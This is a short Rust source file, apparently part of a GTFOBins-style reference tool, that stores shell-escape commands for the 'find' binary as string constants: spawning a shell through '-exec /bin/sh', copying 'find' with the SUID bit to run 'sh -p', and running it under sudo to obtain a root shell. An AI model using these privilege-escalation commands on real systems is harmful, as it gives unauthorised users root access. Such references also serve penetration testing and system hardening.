
pub static BIN_NAME: &'static str = "find";
pub static SH_CODE: &'static str = r#"
    
    find . -exec /bin/sh \; -quit
"#;
pub static SUID_CODE: &'static str = r#"
    
    sudo install -m =xs $(which find) .

    ./find . -exec /bin/sh -p \; -quit
"#;
pub static SUDO_CODE: &'static str = r#"
    
    sudo find . -exec /bin/sh \; -quit
"#;
use crate::code::{Code, Tag};
pub static SH: Code<'static> = Code { 
	title: "SH_CODE",
	code: SH_CODE,
	tag: Tag::SH,
};
pub static SUID: Code<'static> = Code { 
	title: "SUID_CODE",
	code: SUID_CODE,
	tag: Tag::SUID,
};
pub static SUDO: Code<'static> = Code { 
	title: "SUDO_CODE",
	code: SUDO_CODE,
	tag: Tag::SUDO,
};
